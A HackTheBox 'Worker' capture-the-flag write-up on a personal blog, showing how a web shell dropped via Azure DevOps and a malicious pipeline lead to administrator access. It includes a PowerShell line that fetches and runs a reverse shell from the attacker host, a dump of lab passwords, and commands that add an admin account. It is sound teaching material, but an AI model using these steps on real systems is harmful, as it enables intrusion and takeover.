<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox - Worker | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="Learn how Azure Pipelines can be exploited"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.medium.com/hack-the-box-worker-10-10-10-203-writeup-8af64e72a11d><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.7b5ea20897d40a31378e5125d60ab6ae74024bf2fc0edda6ffc05b54c2964018.css integrity="sha256-e16iCJfUCjE3jlEl1gq2rnQCS/L8Dt2m/8BbVMKWQBg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.85.0"><script>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g+"?ref=bwt",d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","711neo6qfi")</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Worker"><meta property="og:description" content="Learn how Azure Pipelines can be exploited"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-worker/"><meta property="og:image" content="https://fahmifj.github.io/writeups/hackthebox/htb-worker/imgs/image-20210503170102363.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-05-03T17:01:02+07:00"><meta property="article:modified_time" content="2021-05-03T17:01:02+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/writeups/hackthebox/htb-worker/imgs/image-20210503170102363.png"><meta name=twitter:title content="HackTheBox - Worker"><meta name=twitter:description content="Learn how Azure Pipelines can be exploited"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - Worker","item":"https://fahmifj.github.io/writeups/hackthebox/htb-worker/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Worker","name":"HackTheBox - Worker","description":"Learn how Azure Pipelines can be exploited","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I’m able to gain administrator access by exploiting Azure Pipeline.\nSkills Learned  SVN enumeration Windows enumeration Exploiting Azure Pipelines  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux svn cli client - Preinstalled in Kali Linux Evil-WinRM - https://github.com/Hackplayers/evil-winrm  Reconnaissance Nmap An initial TCP scan with nmap discovers two open ports: 80 (HTTP) and 3690 (Subversion)\n→ root@kali «worker» «10.10.14.19» $ nmap -sC -sV -oN worker-initial -v 10.10.10.203 # Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203 Nmap scan report for dimension.worker.htb (10.10.10.203) Host is up (0.16s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 3690/tcp open svnserve Subversion Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.\n→ root@kali «worker» «10.10.14.19» $ nmap -p53,445,389,5985 10.10.10.203 Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-31 13:34 EST Host is up (0.013s latency). PORT STATE SERVICE 53 filtered domain 389 filtered ldap 445 filtered microsoft-ds 5985 open wsman Enumeration TCP 80 - Website Visiting the port 80 displays the IIS default page.\nTCP 3690 - Subversion/SVN This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I’ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.\nThe general usage as follows:\nsvn  svn://[ip]  Example of subcommand: ls, cat, info, log.  With the subcommand ls, I can list the repository contents.\n→ root@kali «worker» «192.168.2.103» $ svn ls svn://10.10.10.203 dimension.worker.htb/ moved.txt moved.txt tells that the repository is no longer maintained. The latest repo is available at http://devops.worker.htb\n→ root@kali «worker» «192.168.2.103» $ svn cat svn://10.10.10.203/moved.txt This repository has been migrated and will no longer be maintaned here. You can find the latest version at: http://devops.worker.htb // The Worker team :) With the subcommand info, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).\n→ root@kali «worker» «192.168.2.103» $ svn info svn://10.10.10.203 Path: . URL: svn://10.10.10.203 Relative URL: ^/ Repository Root: svn://10.10.10.203 Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1 Revision: 5 Node Kind: directory Last Changed Author: nathen Last Changed Rev: 5 Last Changed Date: 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) I can check the revision log using the sub command log.\n→ root@kali «worker» «192.168.2.103» $ svn log svn://10.10.10.203 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r5 | nathen | 2020–06–20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line Added note that repo has been migrated - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r4 | nathen | 2020–06–20 09:50:20 -0400 (Sat, 20 Jun 2020) | 1 line Moving this repo to our new devops server which will handle the deployment for us - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r3 | nathen | 2020–06–20 09:46:19 -0400 (Sat, 20 Jun 2020) | 1 line - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r2 | nathen | 2020–06–20 09:45:16 -0400 (Sat, 20 Jun 2020) | 1 line Added deployment script - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r1 | nathen | 2020–06–20 09:43:43 -0400 (Sat, 20 Jun 2020) | 1 line First version - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - The commit message on r2 seems interesting.\nI can check the differences between r1 and r2 using the subcommand diff. The output shows there is a hard-coded credentials.\n→ root@kali «worker» «192.168.2.103» $ svn diff -r 1:2 svn://10.10.10.203/ From here, I’ll take note about what I’ve found here.\n Two subdomains: dimension.worker.htb and devops.worker.htb A set of credentials: nathen:wendel98  I’ll add those two subdomains to my /etc/hosts file.\n10.10.10.203 dimension.worker.htb devops.worker.htb Then after I make sure there is nothing left, I’ll revisit port 80 with the newly discovered subdomain.\nTCP 80 - dimension.worker.htb Visiting dimension.worker.htb presented with a static page.\nIt even leads to others static site (with subdomain) which I think they are just decoy.\nBefore moving on, I’ll add all the subdomains I found on /#work to my /etc/hosts. They are:\n alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb  Now I’ll jump over to the mentioned new DevOps server at http://devops.worker.htb.\nFoothold Shell as IIS appool Azure DevOps - SmartHotel360 Visiting http://devops.worker.htb pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, nathen, is currently working on a project called “SmartHotel360”.\nMy first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.\nUser permission or group related settings are found to be under the Security menu (Project Settings - Security Settings).\nIt seems user nathen is the only member of the SmartHotel360 Team.\nAnd the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.\nThe Contributors group and Projects Valid Users group permissions are defined here, and user nathen inherits those two groups' permission.\nFrom there, I try to lookup into the project’s repository.\nI find a bunch of website repositories on the Repos menu. These repositories are previously listed on http://dimension.worker.htb/#work page. User nathen is the author of these repositories.\nOn the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.\n My video recommendation about CICD: https://www.youtube.com/watch?v=scEDHsr3APg\n User nathen is allowed to queue a builds.\nWith all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.\nWebshell Upload On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.\nSo, I’ll upload my web shell which is cmdasp.aspx (because the web server is IIS) on a new branch. I’ll be using the alpha repository.\nI’ll pick any available work items.\nI can just drag and drop the web shell, and commit it afterwards.\nFrom here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.\nIf I choose a pull request, it needs to be reviewed first and the reviewer is the user nathen itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.\nThe other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).\nAfter the build finished, I can see my web shell is available at alpha.worker.htb/cmdasp.aspx.\nTo gain an interactive shell, I’ll setup a netcat listener on my Kali, then I’ll upload a PowerShell reverse shell called itsf.ps1 and execute it via the web shell.\npowershell.exe \"mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\\temp\\itsf.ps1;C:\\temp\\itsf.ps1\" I have a shell now on my listener.\nPrivilege Escalation Shell as robisl Internal Enumeration Enumerating the user groups and privileges using the whoami /all command reveals that IIS appool has SeImpersonatePrivilege which according to BookHackTrick, it can be abused using RogueWinRM.\nUnfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!\nEnumerating the Users folder finds two users, robisl and restorer (as the name implies, it restore the box configuration, I’ll ignore this).\nBy using the net command, it shows that robisl can login remotely.\nPS C:\\Users net user robisl User name robisl Full Name Robin Islip Comment User’s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2020-04-05 21:27:26 Password expires Never Password changeable 2020-04-05 21:27:26 Password required No User may change password No Workstations allowed All Logon script User profile Home directory Last logon 2020-08-18 18:28:36 Logon hours allowed All Local Group Memberships *Production *Remote Global Group memberships *None The command completed successfully. With net command, I also find there is another drive mounted as W:\\\nPS C:\\users\\net share Share name Resource Remark ------------------------------------------------------------------------------- C$ C:\\ Default share IPC$ Remote IPC W$ W:\\ Default share ADMIN$ C:\\Windows Remote Admin The command completed successfully. There are 4 folders in the W:\\ drive, the one that interesting is the svnrepos folder.\nPS W:\\ dir Directory: W:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2020-06-16 18:59 agents d----- 2020-03-28 15:57 AzureDevOpsData d----- 2020-04-03 11:31 sites d----- 2020-06-20 16:04 svnrepos I can enumerate all folder and sub folder on the W:\\ drive recursively using the dir command. Because I’m on PowerShell, I have to use cmd /c  keyword.\nPS W:\\ cmd.exe /c \"dir /s /b svnrepos\" Well PowerShell can do that too, but I prefer cmd.\nPS W:\\ Get-ChildItem -Path W:\\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force In the output, there is a passwd file that immediately draws my attention\nThe passwd file contains a bunch of credentials, and my eyes caught the password for robisl.\nPS W:\\svnrepos\\ gc .\\www\\conf\\passwd ### This file is an example password file for svnserve. ### Its format is similar to that of svnserve.conf. As shown in the ### example below it contains one section labelled [users]. ### The name and password for each user follow, one account per line. [users] nathen = wendel98 nichin = fqerfqerf nichin = asifhiefh noahip = player nuahip = wkjdnw oakhol = bxwdjhcue owehol = supersecret paihol = painfulcode parhol = gitcommit pathop = iliketomoveit pauhor = nowayjose payhos = icanjive perhou = elvisisalive peyhou = ineedvacation phihou = pokemon quehub = pickme quihud = kindasecure rachul = guesswho raehun = idontknow ramhun = thisis ranhut = getting rebhyd = rediculous reeinc = iagree reeing = tosomepoint reiing = isthisenough renipr = dummy rhiire = users riairv = canyou ricisa = seewhich robish = onesare robisl = wolves11 robive = andwhich ronkay = onesare rubkei = the rupkel = sheeps ryakel = imtired sabken = drjones samken = aqua sapket = hamburger sarkil = friday Remote Access - robisl I can login remotely using robisl credentials with evil-winrm.\n→ root@kali «worker» «10.10.14.19» $ evil-winrm -i 10.10.10.203 -u robisl -p wolves11 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\robisl\\Documents whoami worker\\robisl *Evil-WinRM* PS C:\\Users\\robisl\\Documents cd ../Desktop *Evil-WinRM* PS C:\\Users\\robisl\\Desktop dir Directory: C:\\Users\\robisl\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 1/29/2020 3:37 PM 34 user.txt Shell as administrator Azure DevOps - PartsUnlimited After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a robisl account.\nLong short story, robisl  is member of Build Administrator.\nThe Build Administrators defined as follows [source].\nExploit Azure Pipelines - Read the Root Flag So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.\nIf I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user robisl also has access to it.\nSo, let’s execute the plan!\nFirst, I’ll create a pipeline (Pipelines - Builds - New Pipeline).\nIn the next section, I’ll choose Azure Repos Git.\nOn the next one, I’ll select “PartsUnlimited” as the repository, because that is the repo where robisl is working on.\nIn the Configure section, scroll down and select the starter pipeline (I forgot the name, but don’t choose the existing one). After that, I’ll modify the pool and the script in the “Review” section to steal the flag.\nThe master branch will be the trigger to run the CI\\CD (If I push a changes to the “PartsUnlimited” repository). Since I have access to the “Setup” pool, I’ll use it as the pool. Lastly, on the steps you can add a task/script you want to run/do. In my case, I want to read the root flag.\nI’ll save it and run it on a new branch.\nI’ll just wait for the output log.\nOnce it completed, I can see the root flag inside the “Steal the flag” output\nCreate User with Administrator Privileges I can also create a privileged user using multi-line script.\n- script: | net user iamf YourComplexPassword /add /domain net localgroup Administrators iamf /add net localgroup \"Remote Management Users\" iamf /add displayName: \"Set IamF to Admin\" I can push it again and wait for it to complete.\nNow I can login with the newly created user.\n References:\n https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/ https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops\u0026tabs=yaml#ci-triggers  ","wordCount":"2380","inLanguage":"en","image":"https://fahmifj.github.io/writeups/hackthebox/htb-worker/imgs/image-20210503170102363.png","datePublished":"2021-05-03T17:01:02+07:00","dateModified":"2021-05-03T17:01:02+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-worker/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class="header sticky"><nav class=nav><div class=container><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="友人F (Alt + H)">友人F</a></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://fahmifj.github.io/writeups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://fahmifj.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://fahmifj.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://fahmifj.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://fahmifj.github.io/about/ title=About><span>About</span></a></li></ul><span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/>Write-ups</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/writeups/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Worker</h1><div class=post-description>Learn how Azure Pipelines can be exploited</div><div class=post-meta>May 3, 2021&nbsp;·&nbsp;12 min&nbsp;·&nbsp;Fahmi FJ
<span class=post-canonical-link>Originally published at<a href=https://fahmifj.medium.com/hack-the-box-worker-10-10-10-203-writeup-8af64e72a11d target=_blank rel="noopener noreferrer"> fahmifj.medium.com</a></span></div></header><figure class=entry-cover><img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-worker/imgs/image-20210503170102363_hua232bba1d6f81c8e0e98412dbd51a08c_140683_360x0_resize_box_2.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-worker/imgs/image-20210503170102363_hua232bba1d6f81c8e0e98412dbd51a08c_140683_480x0_resize_box_2.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-worker/imgs/image-20210503170102363_hua232bba1d6f81c8e0e98412dbd51a08c_140683_720x0_resize_box_2.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-worker/imgs/image-20210503170102363.png 740w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-worker/imgs/image-20210503170102363.png alt="HackTheBox - Worker"><p>HackTheBox - Worker</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><ul><li><a href=#skills-learned aria-label="Skills Learned">Skills Learned</a></li><li><a href=#tools aria-label=Tools>Tools</a></li></ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#tcp-3690---subversionsvn aria-label="TCP 3690 - Subversion/SVN">TCP 3690 - Subversion/SVN</a></li><li><a href=#tcp-80---dimensionworkerhtb aria-label="TCP 80 - dimension.worker.htb">TCP 80 - dimension.worker.htb</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-iis-appool aria-label="Shell as IIS appool">Shell as IIS appool</a><ul><li><a href=#azure-devops---smarthotel360 aria-label="Azure DevOps - SmartHotel360">Azure DevOps - SmartHotel360</a></li><li><a href=#webshell-upload aria-label="Webshell Upload">Webshell Upload</a></li></ul></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-robisl aria-label="Shell as robisl">Shell as robisl</a><ul><li><a href=#internal-enumeration aria-label="Internal Enumeration">Internal Enumeration</a></li><li><a href=#remote-access---robisl aria-label="Remote Access - robisl">Remote Access - robisl</a></li></ul></li><li><a href=#shell-as-administrator aria-label="Shell as administrator">Shell as administrator</a><ul><li><a href=#azure-devops---partsunlimited aria-label="Azure DevOps - PartsUnlimited">Azure DevOps - PartsUnlimited</a></li><li><a href=#exploit-azure-pipelines---read-the-root-flag aria-label="Exploit Azure Pipelines - Read the Root Flag">Exploit Azure Pipelines - Read the Root Flag</a></li><li><a href=#create-user-with-administrator-privileges aria-label="Create User with Administrator Privileges">Create User with Administrator Privileges</a></li></ul></li></ul></li></ul></div></details></div><div class=post-content><p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I&rsquo;m able to gain administrator access by exploiting Azure Pipeline.</p><h3 id=skills-learned>Skills Learned<a hidden class=anchor aria-hidden=true href=#skills-learned>#</a></h3><ul><li>SVN enumeration</li><li>Windows enumeration</li><li>Exploiting Azure Pipelines</li></ul><h3 id=tools>Tools<a hidden class=anchor aria-hidden=true href=#tools>#</a></h3><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>svn cli client - Preinstalled in Kali Linux</li><li>Evil-WinRM - <a href=https://github.com/Hackplayers/evil-winrm>https://github.com/Hackplayers/evil-winrm</a></li></ul><h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@kali «worker» «10.10.14.19» 
$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
<span style=color:#75715e># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
Nmap scan report <span style=color:#66d9ef>for</span> dimension.worker.htb <span style=color:#f92672>(</span>10.10.10.203<span style=color:#f92672>)</span>
Host is up <span style=color:#f92672>(</span>0.16s latency<span style=color:#f92672>)</span>.

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
3690/tcp open  svnserve Subversion
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@kali «worker» «10.10.14.19»
$ nmap -p53,445,389,5985 10.10.10.203
Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-01-31 13:34 EST
Host is up <span style=color:#f92672>(</span>0.013s latency<span style=color:#f92672>)</span>.

PORT     STATE     SERVICE
<span style=color:#ae81ff>53</span>       filtered  domain
<span style=color:#ae81ff>389</span>      filtered  ldap
<span style=color:#ae81ff>445</span>      filtered  microsoft-ds
<span style=color:#ae81ff>5985</span>     open      wsman
</code></pre></div><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a hidden class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>Visiting the port 80 displays the IIS default page.</p><p><img class=img-container src=imgs/image-20210503174900610.png alt=image-20210503174900610></p><h3 id=tcp-3690---subversionsvn>TCP 3690 - Subversion/SVN<a hidden class=anchor aria-hidden=true href=#tcp-3690---subversionsvn>#</a></h3><p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p><p>The general usage as follows:</p><pre><code>svn &lt;sub-command&gt; svn://[ip]
</code></pre><ul><li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li></ul><p>With the subcommand <code>ls</code>, I can list the repository contents.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@kali «worker» «192.168.2.103»
$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div><p><code>moved.txt</code> tells that the repository is no longer maintained. The latest repo is available at <code>http://devops.worker.htb</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@kali «worker» «192.168.2.103»
$ svn cat svn://10.10.10.203/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span style=color:#f92672>)</span>
</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@kali «worker» «192.168.2.103»
$ svn info svn://10.10.10.203
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: <span style=color:#ae81ff>5</span>
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: <span style=color:#ae81ff>5</span>
Last Changed Date: 2020-06-20 09:52:00 -0400 <span style=color:#f92672>(</span>Sat, <span style=color:#ae81ff>20</span> Jun 2020<span style=color:#f92672>)</span>
</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@kali «worker» «192.168.2.103»
$ svn log svn://10.10.10.203
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r5 | nathen | 2020–06–20 09:52:00 -0400 <span style=color:#f92672>(</span>Sat, <span style=color:#ae81ff>20</span> Jun 2020<span style=color:#f92672>)</span> | <span style=color:#ae81ff>1</span> line
Added note that repo has been migrated
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r4 | nathen | 2020–06–20 09:50:20 -0400 <span style=color:#f92672>(</span>Sat, <span style=color:#ae81ff>20</span> Jun 2020<span style=color:#f92672>)</span> | <span style=color:#ae81ff>1</span> line
Moving this repo to our new devops server which will handle the deployment <span style=color:#66d9ef>for</span> us
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r3 | nathen | 2020–06–20 09:46:19 -0400 <span style=color:#f92672>(</span>Sat, <span style=color:#ae81ff>20</span> Jun 2020<span style=color:#f92672>)</span> | <span style=color:#ae81ff>1</span> line
-
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r2 | nathen | 2020–06–20 09:45:16 -0400 <span style=color:#f92672>(</span>Sat, <span style=color:#ae81ff>20</span> Jun 2020<span style=color:#f92672>)</span> | <span style=color:#ae81ff>1</span> line
Added deployment script
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r1 | nathen | 2020–06–20 09:43:43 -0400 <span style=color:#f92672>(</span>Sat, <span style=color:#ae81ff>20</span> Jun 2020<span style=color:#f92672>)</span> | <span style=color:#ae81ff>1</span> line
First version
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
